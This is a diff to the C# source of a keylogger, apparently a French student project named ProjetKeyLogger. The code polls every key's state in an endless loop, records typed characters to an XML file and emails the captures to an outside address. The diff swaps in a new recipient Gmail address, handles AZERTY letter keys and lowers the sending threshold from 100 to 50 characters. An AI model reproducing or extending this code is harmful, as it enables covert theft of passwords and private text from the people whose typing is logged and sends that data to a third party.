@@ -41,7 +41,6 @@ namespace ProjetKeyLogger
 
             //Chemin pour enregistrer le fichier XML
             file_path = "Capture.xml";
-
         }
 
         //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
@@ -49,8 +48,7 @@ namespace ProjetKeyLogger
         // l'argument est une "virtual key code " car chaque action est asscoiée à une clé
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(int cle);
-
-        
+                
         public void capture()
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
@@ -66,29 +64,23 @@ namespace ProjetKeyLogger
 
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
-
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                 Thread.Sleep(sleep_time); //nombre en miliseconde
 
                 //verification de l'état de chaque touche (up ou down)
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
-                        Console.WriteLine(codeASCII);
-
                         //le temps d'innactivité est reinitialisé
                         date_dernier_activite = DateTime.Now;
 
                         string valeurs;
                         switch (codeASCII)
                         {
-                            //Si touche Entrée ou clic droit ou gauche
-                            case 1:
-                            case 2:
+                            //Si touche Entrée
                             case 13:
                                 //On ajoute l'enregistrement a la collection
                                 collection_enregistrement.ajouterNew(enregistrement);
@@ -162,7 +154,6 @@ namespace ProjetKeyLogger
                                         {
                                             valeurs = "0123456789";
                                             enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 48, 1));
-
                                         }
                                     }
                                 }
@@ -187,7 +178,6 @@ namespace ProjetKeyLogger
                                 {
                                     valeurs = "0123456789";
                                     enregistrement.ajouterContenu(valeurs.Substring(codeASCII - 96, 1));
-
                                 }
                                 break;
 
@@ -325,8 +315,33 @@ namespace ProjetKeyLogger
                             case 255:
                                 break;
 
-
-                            default:
+                                //ordre : azertyuiopqsdfghjklmwxcvbn 
+                            case 65:
+                            case 90:
+                            case 69:
+                            case 82:
+                            case 84:
+                            case 89:
+                            case 85:
+                            case 73:
+                            case 79:
+                            case 80:
+                            case 81:
+                            case 83:
+                            case 68:
+                            case 70:
+                            case 71:
+                            case 72:
+                            case 74:
+                            case 75:
+                            case 76:
+                            case 77:
+                            case 87:
+                            case 88:
+                            case 67:
+                            case 86:
+                            case 66:
+                            case 78:
                                 if (ctrl == true)
                                 {
                                     ctrl = false;
@@ -334,7 +349,6 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == true | shift == true)
                                     {
-                                        
                                         enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII).ToString());
                                         shift = false;
                                     }
@@ -343,16 +357,14 @@ namespace ProjetKeyLogger
                                         enregistrement.ajouterContenu(Char.ToLower((char)codeASCII).ToString());
                                     }
                                 }
-                               
                                 break;
                         }
-
                         nb_caractere_tape += 1;
                     }
 
                     //SI le nombre de caracteres tapés a dépassé la limite
                     //Et si le temps d'innactivité a dépassé 5 minutes
-                    if (nb_caractere_tape > 100 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
+                    if (nb_caractere_tape > 50 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
                     {
                         //On ajoute l'enregistrement a la collection
                         collection_enregistrement.ajouterNew(enregistrement);
@@ -376,9 +388,7 @@ namespace ProjetKeyLogger
                         //envoie du mail
                         envoieMail();
                     }
-                    
-                }
-                                
+                }            
             }
         }
 
@@ -413,7 +423,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            message_mail.To.Add("camenenlythiery@gmail.com");
+            message_mail.To.Add("tulaurapas35@gmail.com");
 
             //defition de l'objet du mail
             message_mail.Subject = objet_mail;
